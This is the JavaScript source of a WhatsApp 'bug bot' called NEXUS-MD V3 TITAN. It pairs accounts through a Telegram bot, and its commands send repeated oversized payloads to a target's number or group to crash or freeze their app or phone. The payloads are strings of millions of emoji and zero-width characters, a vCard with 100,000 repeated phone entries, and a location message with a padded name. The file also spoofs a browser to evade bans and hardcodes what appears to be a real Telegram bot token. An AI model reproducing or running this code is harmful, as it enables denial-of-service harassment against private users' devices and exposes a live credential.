const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ TITAN CONFIG ---
const TG_TOKEN = '8745872876:AAGB05dkcWF1uHJZgn6nFEZf325l4cluDfs'; 
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD V3 TITAN",
    owner: "94767475809", 
    prefix: ".",
};

// 24/7 Stability Server
app.get('/', (req, res) => res.send('TITAN OBLITERATOR ONLINE ☠️'));
app.listen(PORT, () => console.log(`Titan Core Active: ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    
    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "22.0.04"], // 🔥 Anti-Ban Engine
        syncFullHistory: false
    });

    // --- 🤖 STABLE TELEGRAM HANDLER (ANTI-LOOP) ---
    const processed = new Set();
    tgBot.on('message', async (msg) => {
        if (msg.from.is_bot || processed.has(msg.message_id)) return;
        processed.add(msg.message_id);

        if (msg.text === '/start') {
            const welcome = `🔱 *NEXUS-MD V3: TITAN DESTROYER*\n\nStatus: *Global Active*\nMaster: *Sasiya MD*\n\nEnter Number with 94 code.`;
            return tgBot.sendMessage(msg.chat.id, welcome, { parse_mode: 'Markdown' });
        }

        if (msg.text && /^\d+$/.test(msg.text) && msg.text.length > 9) {
            try {
                let code = await sock.requestPairingCode(msg.text.trim());
                tgBot.sendMessage(msg.chat.id, `⚡ *TITAN KEY:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ API Blocked! Retry."); }
        }
        setTimeout(() => processed.delete(msg.message_id), 3600000);
    });

    // --- ☣️ GLOBAL 8,000,000+ TITAN PAYLOADS ---
    const p_titan = "☠️".repeat(1000000) + "​".repeat(7000000); // UI & System Death
    const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Titan-Nexus;;;\nFN:Titan\n" + "TEL;type=CELL;waid=94767475809:".repeat(100000) + "\nEND:VCARD"; // Contact System Death
    const p_loc = { location: { degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name: "NEXUS-TITAN DEATH ZONE" + "​".repeat(2000000) } };

    // --- 📩 THE TITAN ATTACK HANDLER ---
    sock.ev.on('messages.upsert', async (m) => {
        try {
            const mek = m.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            if (!from.startsWith(botConfig.owner)) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            switch (command) {
                case 'menu':
                    const titanMenu = `
┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🔱 *NEXUS-MD V3: TITAN* 🔱
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
┃
┃ 🩸 *POWER:* \`8,000,000+\`
┃ ⚡ *MODE:* _System Obliterator_
┃ 💻 *DEV:* _Sasiya MD_
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ☣️ *T I T A N  B U G S*
┣━━━━━━━━━━━━━━━━━━━━━━━━┛
┃ ☠️ *.kill* [num] - _App White Screen_
┃ 🔥 *.crash* [num] - _Full OS Lag_
┃ 💀 *.destroy* [num] - _RAM Overflow_
┃ ❄️ *.freeze* [num] - _UI Hard Lock_
┃ 🌀 *.wipe* [jid] - _Group Nuclear_
┃ 🌌 *.the_end* [num] - _Infinite Loop_
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⚡ *V I P  A T T A C K S*
┣━━━━━━━━━━━━━━━━━━━━━━━━┛
┃ 📍 *.loc_kill* [num] - _Location_
┃ 📇 *.vcard_dead* [num] - _V-Card_
┃ 📞 *.call_hang* [num] - _Call Crash_
┃ 🎬 *.vid_bomb* [num] - _Video Lag_
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  🛡️ *D E V E L O P E R  N E X U S*
┗━━━━━━━━━━━━━━━━━━━━━━━━┛`;
                    await sock.sendMessage(from, { text: titanMenu });
                    break;

                // --- 🚀 ATTACK LOGIC (VIP COMMANDS) ---
                case 'kill':
                case 'crash':
                case 'the_end':
                case 'destroy':
                case 'freeze':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: `🔱 *TITAN ATTACKING:* ${targetNum}\n🚀 *POWER:* 8M Overload...` });
                    for(let i=0; i<40; i++) {
                        await sock.sendMessage(targetJid, { text: p_titan });
                        await delay(80); 
                    }
                    await sock.sendMessage(from, { text: "✅ *TARGET DELETED!* 💀" });
                    break;

                case 'vcard_dead':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "📇 *INJECTING TITAN V-CARD...*" });
                    for(let i=0; i<30; i++) {
                        await sock.sendMessage(targetJid, { text: p_vcard });
                        await delay(120);
                    }
                    break;

                case 'loc_kill':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "📍 *SENDING TITAN LOCATION...*" });
                    for(let i=0; i<25; i++) {
                        await sock.sendMessage(targetJid, p_loc);
                        await delay(150);
                    }
                    break;

                case 'call_hang':
                case 'vid_bomb':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "📞 *INITIATING CALL/VIDEO CRASH...*" });
                    for(let i=0; i<35; i++) {
                        await sock.sendMessage(targetJid, { text: "҉".repeat(2000000) });
                        await delay(80);
                    }
                    break;

                case 'wipe':
                    if (!args[0]) return;
                    await sock.sendMessage(from, { text: "🌀 *GROUP NUCLEAR WIPE INITIATED...*" });
                    for(let i=0; i<60; i++) {
                        await sock.sendMessage(args[0], { text: p_titan });
                        await delay(100);
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (u) => { if (u.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
